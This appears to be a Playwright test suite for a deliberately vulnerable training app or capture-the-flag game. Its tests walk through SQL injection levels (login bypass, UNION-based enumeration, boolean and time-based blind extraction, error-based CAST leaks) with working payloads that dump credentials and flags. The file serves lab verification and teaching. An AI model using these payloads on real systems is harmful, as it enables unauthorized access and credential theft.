import { test, expect } from '@playwright/test'


test.describe('Level 1-1: Login Bypass', () => {
  test('payload 1 - comment out password check', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })

  test('payload 2 - force true condition on password', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', 'admin')
    await page.fill('#password', "' OR '1'='1")
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })
})

test.describe('Level 1-2: WHERE Clause Bypass', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
  })

  test('payload - comment out confidential filter', async ({ page }) => {
    await page.goto('/dashboard')
    await page.fill('.search-bar input', "' OR 1=1--")
    await page.click('.search-btn')
    await expect(page.locator('.badge-confidencial').first()).toBeVisible()
  })
})

test.describe('Level 1-3: UNION-Based DB Enumeration', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
    await page.goto('/dashboard/transfers')
  })

  test('step 1 - ORDER BY 10 succeeds (10 columns exist)', async ({ page }) => {
    await page.fill('.search-bar input', "' ORDER BY 10--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).not.toBeVisible()
  })

  test('step 2 - ORDER BY 11 errors (only 10 columns)', async ({ page }) => {
    await page.fill('.search-bar input', "' ORDER BY 11--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
  })

  test('step 3 - UNION SELECT NULLs confirms injection point', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--")
    await page.click('.search-btn')
    await expect(page.locator('.congrats-banner')).toBeVisible()
  })

  test('step 4 - enumerate tables via information_schema', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--")
    await page.click('.search-btn')
    const nameCells = page.locator('.entries-table tbody tr td:nth-child(2)')
    await expect(nameCells.filter({ hasText: 'jumentususers' }).first()).toBeVisible()
  })

  test('step 5 - enumerate columns of jumentususers', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='jumentususers'--")
    await page.click('.search-btn')
    const nameCells = page.locator('.entries-table tbody tr td:nth-child(2)')
    await expect(nameCells.filter({ hasText: 'password' }).first()).toBeVisible()
  })

  test('step 6 - dump credentials from jumentususers', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,username,password,role,NULL,NULL,NULL,NULL,NULL,NULL FROM jumentususers--")
    await page.click('.search-btn')
    const rows = page.locator('.entries-table tbody tr')
    await expect(rows.filter({ hasText: 'cristiano' }).filter({ hasText: 'goat7' }).first()).toBeVisible()
  })
})

test.describe('Level 2-1: Boolean-Based Blind SQLi', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/tickets')
  })

  test('step 1a - true condition returns available (injection confirmed)', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND 1=1--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('step 1b - false condition returns unavailable (injection confirmed)', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND 1=2--")
    await page.click('.search-btn')
    await expect(page.locator('.result-unavailable')).toBeVisible()
  })

  test('step 2a - count of public tables is 2', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=2--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('step 2b - first character of first table name is b', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0)='b'--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('step 3 - flag length is 27', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT LENGTH(juice) FROM unsuspecting_table WHERE id=1)=27--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('step 4a - first character of flag is J', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='J'--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('step 4b - second character of flag is U', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,2,1) FROM unsuspecting_table WHERE id=1)='U'--")
    await page.click('.search-btn')
    await expect(page.locator('.result-available')).toBeVisible()
  })

  test('congrats banner appears on last character confirmation', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,27,1) FROM unsuspecting_table WHERE id=1)='}'--")
    await page.click('.search-btn')
    await expect(page.locator('.congrats-21')).toBeVisible()
  })
})

test.describe('Level 2-2: Time-Based Blind SQLi', () => {
  const SLEEP_THRESHOLD = 2500

  test.beforeEach(async ({ page }) => {
    await page.goto('/tickets')
  })

  test('confirm timing injection - unconditional sleep causes delay', async ({ page }) => {
    const start = Date.now()
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(3))a)--")
    await page.click('.search-btn')
    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
  })

  test('step 2 - table unsuspecting_table exists (3s delay)', async ({ page }) => {
    const start = Date.now()
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='unsuspecting_table')=1 THEN 3 ELSE 0 END))a)--")
    await page.click('.search-btn')
    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
  })

  test('step 3 - flag length is 27 (3s delay)', async ({ page }) => {
    const start = Date.now()
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT LENGTH(juice) FROM unsuspecting_table WHERE id=1)=27 THEN 3 ELSE 0 END))a)--")
    await page.click('.search-btn')
    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
  })

  test('step 4a - first character of flag is J (3s delay)', async ({ page }) => {
    const start = Date.now()
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='J' THEN 3 ELSE 0 END))a)--")
    await page.click('.search-btn')
    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
  })

  test('step 4b - wrong character causes no delay', async ({ page }) => {
    const start = Date.now()
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='X' THEN 3 ELSE 0 END))a)--")
    await page.click('.search-btn')
    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
    expect(Date.now() - start).toBeLessThan(SLEEP_THRESHOLD)
  })

  test('congrats banner appears on last character confirmation with timing', async ({ page }) => {
    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,27,1) FROM unsuspecting_table WHERE id=1)='}' THEN 3 ELSE 0 END))a)--")
    await page.click('.search-btn')
    await expect(page.locator('.congrats-22')).toBeVisible({ timeout: 10000 })
  })
})

test.describe('Level 1-4: Error-Based Data Extraction', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', 'cristiano')
    await page.fill('#password', 'goat7')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
    await page.goto('/dashboard/perfil')
  })

  test('step 1 - true condition returns found', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=1--')
    await page.click('.search-btn')
    await expect(page.locator('.result-found')).toBeVisible()
  })

  test('step 2 - false condition returns not found (injection confirmed)', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=2--')
    await page.click('.search-btn')
    await expect(page.locator('.result-not-found')).toBeVisible()
  })

  test('step 3 - CAST error leaks table name from information_schema', async ({ page }) => {
    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
  })

  test('step 4 - CAST error leaks column name from segredos', async ({ page }) => {
    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
  })

  test('step 5 - CAST error leaks flag from segredos.valor', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--')
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toContainText('JUMENTOS{')
    await expect(page.locator('.congrats-banner')).toBeVisible()
  })
})
